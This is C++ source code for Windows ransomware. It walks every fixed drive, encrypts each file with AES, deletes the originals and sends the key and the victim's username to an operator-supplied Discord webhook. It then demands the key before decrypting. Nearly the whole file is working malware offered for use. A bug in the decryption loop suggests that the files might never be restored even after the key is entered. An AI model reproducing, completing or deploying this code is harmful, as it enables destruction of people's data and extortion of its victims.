///define to block Error C4996 - getenv unsafe
#define _CRT_SECURE_NO_WARNINGS

///Libs for code operation
#include <iostream>
#include <filesystem>
#include <vector>
#include<fstream>
#include <bitset>
#include <conio.h>
#include <map>
#include <bitset>
#include <string>

///Lib Webhook discord
#include <curl/curl.h>
#include <nlohmann/json.hpp>

//Lib info User
#include <json/json.h>

///Libs for cryptography - Cryptopp
#include "cryptlib.h"
#include "rijndael.h"
#include "modes.h"
#include "files.h"
#include "osrng.h"
#include "hex.h"
#include "filters.h"
#include "aes.h"
#include "pwdbased.h"
#include "secblock.h"

using namespace CryptoPP;
namespace fs = std::filesystem;
using json = nlohmann::json;

///Discord Webhook value
#define DiscordWebHook "----- Put Your Discord Webhook Here ! -----"



/// <summary>
/// Function to send the value of the aes key and user informations to your personal discord 
/// </summary>
/// <param name="Key"></param>
/// <returns></returns>
int SendInfoToDiscord(std::string Key) {
    CURL* curl;
    CURLcode res;
    std::string readBuffer;

    curl = curl_easy_init();
    if (curl) {
        json data;
        std::string username = getenv("USERNAME");

        data["content"] = "\n\n" + username + "'s computer got lock !\nKey information below:";
        data["embeds"] = {
            {
                { "title", Key},
                { "description", "More informations will be added soon ..."},
                { "color", 9109504 },
                { "footer", {
                    { "text", "@Flandre Scarlet" },
                    { "icon_url", "https://media.discordapp.net/attachments/1044377792881623093/1070478768348606464/75f2884b7314cab1ec8ddad0f614fb1f.png" }
                } }
            }
        };
        data["avatar_url"] = "https://media.discordapp.net/attachments/1044377792881623093/1070478768348606464/75f2884b7314cab1ec8ddad0f614fb1f.png";
        data["username"] = "Forbidden Barrage";
        data["attachments"] = json::array();

        struct curl_slist* chunk = NULL;
        chunk = curl_slist_append(chunk, "Content-Type: application/json");
        std::string payload = data.dump();

        curl_easy_setopt(curl, CURLOPT_URL, DiscordWebHook);
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
        }

        curl_easy_cleanup(curl);
        curl_slist_free_all(chunk);
    }

    return 0;
}


/// <summary>
/// Function to list the basic folders of the hard disk
/// </summary>
/// <param name="path"></param>
/// <returns></returns>
std::vector<std::string> ls_list_directory_from_root_windows(const std::filesystem::path& path) {
    std::vector<std::string> vtr;
    for (const auto& entry : fs::directory_iterator(path)) {
        try {
            vtr.push_back(entry.path().string());
        }
        catch (const std::exception& ex) {
            std::cout << "Impossible to list files from the root directory" << std::endl;
        }
    }
    return vtr;
}

/// <summary>
/// Function to encrypt user's files
/// </summary>
/// <param name="filename"></param>
/// <param name="key"></param>
/// <param name="iv"></param>
void lock(std::string filename, byte* key, byte* iv)
{
    // Load file into memory
    std::ifstream input(filename.c_str(), std::ios::binary);
    std::vector<byte> plaintext((std::istreambuf_iterator<char>(input)), std::istreambuf_iterator<char>());
    input.close();

    // Encrypt the data
    std::string ciphertext;
    CBC_Mode<AES>::Encryption encryption(key, AES::DEFAULT_KEYLENGTH, iv);
    StringSource(plaintext.data(), plaintext.size(), true, new StreamTransformationFilter(encryption, new StringSink(ciphertext)));

    // Save the encrypted file to disk
    std::string new_filename = filename + ".enc";
    std::ofstream output(new_filename.c_str(), std::ios::binary);
    output << ciphertext;
    output.close();

    // Delete the original file 
    remove(filename.c_str());
}

/// <summary>
/// Function to decrypt user's files
/// </summary>
/// <param name="filename"></param>
/// <param name="key"></param>
/// <param name="iv"></param>
void unlock(std::string filename, byte* key, byte* iv)
{
    // Remove the ".enc" extension from the file name
    std::string new_filename = filename.substr(0, filename.size() - 4);

    // Copy the content of the encrypted file into a new variable
    std::ifstream input(filename.c_str(), std::ios::binary);
    std::string ciphertext((std::istreambuf_iterator<char>(input)), std::istreambuf_iterator<char>());
    input.close();

    // Decrypt the data
    std::string plaintext;
    CBC_Mode<AES>::Decryption decryption(key, AES::DEFAULT_KEYLENGTH, iv);
    StringSource(ciphertext, true, new StreamTransformationFilter(decryption, new StringSink(plaintext)));

    // Save the decrypted file to disk
    std::ofstream output(new_filename.c_str(), std::ios::binary);
    output << plaintext;
    output.close();

    // Delete the encrypted file
    remove(filename.c_str());
}

/// <summary>
/// Function to recursively browse the listed folders from the hard disk. Returns the list of encrypted files.
/// </summary>
/// <param name="path"></param>
/// <param name="key"></param>
/// <param name="iv"></param>
/// <returns></returns>
std::vector<std::string> ls_recursive_windows(const std::filesystem::path& path, byte* key, byte* iv) {
    std::vector<std::string> vtr;
    for (const auto& p : std::filesystem::recursive_directory_iterator(path)) {
        try {
            if (!std::filesystem::is_directory(p)) {
                std::string encFilePath = p.path().string() + ".enc";
                vtr.push_back(encFilePath);
                std::cout << p.path().string() << std::endl;

                //Run the lock function on each file
                lock(p.path().string(), key, iv);
            }
        }
        catch (const std::exception& ex) {
            std::cout << "unable to list files in root directory folders" << std::endl;
        }
    }
    return vtr;
}


/// <summary>
/// Function to list the hard drives of the computer
/// </summary>
/// <returns></returns>
std::vector<char> ListOfHardwareDisks() {
    std::bitset<32> drives(GetLogicalDrives());
    std::vector<char> goodDrives;
    for (char c = 'A'; c <= 'Z'; ++c) {
        if (drives[c - 'A']) {
            std::string drive = c + std::string(":\\");
            std::wstring wideDrive(drive.begin(), drive.end());
            if (GetDriveType(wideDrive.c_str()) == DRIVE_FIXED) {
                goodDrives.push_back(c);
            }
        }
    }
    return goodDrives;
}

///File listing function for Linux -> will be added in the futur
/*
void ls_list_directory_from_root_Linux(){
    FILE *fpipe;
    char *command = "find /";
    char c = 0;

    if (0 == (fpipe = (FILE*)popen(command, "r")))
    {
        perror("popen() failed.");
        exit(EXIT_FAILURE);
    }

    while (fread(&c, sizeof c, 1, fpipe))
    {
        printf("%c", c);
    }

    pclose(fpipe);
}
*/

/// <summary>
/// Function to compare the values of the original aes key and the entered aes key
/// </summary>
/// <param name="str1"></param>
/// <param name="str2"></param>
/// <returns></returns>
bool compareStrings(const std::string& str1, const std::string& str2) {
    return str1 == str2;
}


/// <summary>
/// Function to check which OS you are in. Foreach OS, there is a call of different functions 
/// </summary>
void CheckOS() {
#if __linux__
    //ls_list_directory_from_root_Linux();
#elif __FreeBSD__

#elif __ANDROID__

#elif __APPLE__

#elif _WIN32
    std::vector<std::string> v1;
    std::vector<std::string> v2;
    std::string unlockKey;

    // Random encryption/decryption key creation
    AutoSeededRandomPool prng;
    byte key[AES::DEFAULT_KEYLENGTH];
    prng.GenerateBlock(key, sizeof(key));

    // Vector initialization
    byte iv[AES::BLOCKSIZE];
    memset(iv, 0x00, AES::BLOCKSIZE);

    // Display the key as a string
    std::string keyString;
    StringSource(key, AES::DEFAULT_KEYLENGTH, true, new HexEncoder(new StringSink(keyString)));

    SendInfoToDiscord(keyString);

    std::cout << "Start of the lock program" << std::endl;

    std::vector<char> ListOfHardDisk = ListOfHardwareDisks();
    std::vector<std::string> Directory_From_Hardware;

    for (char index : ListOfHardDisk) {
        std::string conversion;
        conversion.assign(1, index);
        conversion = conversion + ":\\";
        std::vector<std::string> Directory_From_Hardware = ls_list_directory_from_root_windows(conversion);
        for (std::basic_string<char> i : Directory_From_Hardware) {
            try {
                v2 = ls_recursive_windows(i, key, iv);
                v1.insert(v1.end(), v2.begin(), v2.end());
            }
            catch (const std::exception& ex) {
                std::cout << "Couldn't list the files from the directory : " << i << std::endl;
            }
        }
    }

    std::string unlockey;

    do {
        std::cout << "\nEnter the key :\n";
        std::cin >> unlockey;

    } while (compareStrings(keyString, unlockey) == false);

    for (auto i : Directory_From_Hardware) {
        try {
            unlock(i, key, iv);
        }
        catch (const std::exception& ex) {
            std::cout << "Problem when decrypting the encrypted file" << std::endl;
        }

    }
    std::cout << "Done !" << std::endl;
#else

#endif
}



/// <summary>
/// Start of the program
/// </summary>
/// <returns></returns>
int main() {
    CheckOS();
    return 0;
}


